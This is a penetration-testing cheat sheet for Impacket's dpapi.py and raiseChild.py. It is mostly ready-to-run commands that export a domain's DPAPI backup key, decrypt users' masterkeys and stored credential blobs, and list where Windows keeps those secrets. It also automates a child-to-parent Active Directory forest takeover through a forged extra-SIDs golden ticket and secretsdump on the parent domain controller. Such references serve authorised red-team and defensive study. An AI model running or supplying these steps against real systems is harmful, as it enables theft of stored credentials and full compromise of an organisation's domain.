# 07.03 dpapi.py raiseChild.py DPAPI Trust Escalation

> Decrypt DPAPI master keys with `dpapi.py`; automate the full child→parent forest takeover chain with `raiseChild.py`.

## Overview

dpapi.py decrypts DPAPI master keys and blobs offline. raiseChild.py automates the full child→parent domain compromise: extracts child krbtgt, adds Enterprise Admins SID, forges cross-domain ticket, and dumps parent DC.

## Steps

- DPAPI: system masterkeys protected by SYSTEM password (from LSA secrets); user masterkeys by user password
- Domain backup key: export with -t domain option; decrypts any user masterkey without the user password
- raiseChild requires child domain DA credentials; optionally takes over parent automatically
- raiseChild steps internally: krbtgt dump → domain SID → forge extra-SIDs ticket → exec on parent DC
- -w flag in raiseChild saves the golden ticket to a ccache for manual use
- -target-exec auto-executes secretsdump on the parent DC

## Commands

### DPAPI — get domain backup key (DA required)

```bash
impacket-dpapi backupkeys --export -t domain -k DOMAIN/DA:'P@ss'@DC_IP
# Exports: key-<guid>.pvk — decrypts any domain user masterkey
```

### DPAPI — decrypt user masterkey (password)

```bash
impacket-dpapi masterkey -file /path/to/Protect/<SID>/masterkey_file -password 'userpass' -sid S-1-5-21-...-1001
impacket-dpapi masterkey -file /path/to/masterkey -pvk domain_backupkey.pvk
```

### DPAPI — decrypt credential blob

```bash
impacket-dpapi credential -file /path/to/Credentials/<blobhex> -key <masterkey_hex>
impacket-dpapi blob -file /path/to/blob -key <masterkey_hex>
```

### Typical DPAPI credential hunt path

```text
C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\  ← masterkeys
C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\              ← DPAPI blobs
C:\Users\<user>\AppData\Local\Microsoft\Credentials\                 ← more blobs
HKLM\SECURITY\Policy\Secrets\DPAPI_SYSTEM                           ← system masterkey KEK
```

### raiseChild — automated child→parent compromise

```bash
impacket-raiseChild CHILD.DOMAIN.LOCAL/childadmin:'P@ss' -dc-ip CHILD_DC_IP
# Save golden ticket to file:
impacket-raiseChild CHILD.DOMAIN.LOCAL/childadmin:'P@ss' -dc-ip CHILD_DC_IP -w /tmp/parent_golden.ccache
# Auto-exec secretsdump on parent DC:
impacket-raiseChild CHILD.DOMAIN.LOCAL/childadmin:'P@ss' -dc-ip CHILD_DC_IP -target-exec PARENT_DC_IP
```
